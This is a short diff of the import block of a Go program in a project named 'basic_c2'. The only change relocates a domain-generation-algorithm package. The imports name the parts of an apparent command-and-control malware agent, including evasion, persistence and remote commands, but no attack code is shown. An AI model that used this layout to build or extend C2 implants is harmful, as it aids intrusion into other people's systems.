@@ -2,11 +2,11 @@ package main
 
 import (
 	"basic_c2/agent/commands"
-	"basic_c2/agent/dga"
 	"basic_c2/agent/evasion"
 	"basic_c2/agent/persistence"
 	"basic_c2/internal/config"
 	"basic_c2/internal/crypto"
+	"basic_c2/internal/dga"
 	"basic_c2/internal/models"
 	"bytes"
 	"crypto/tls"
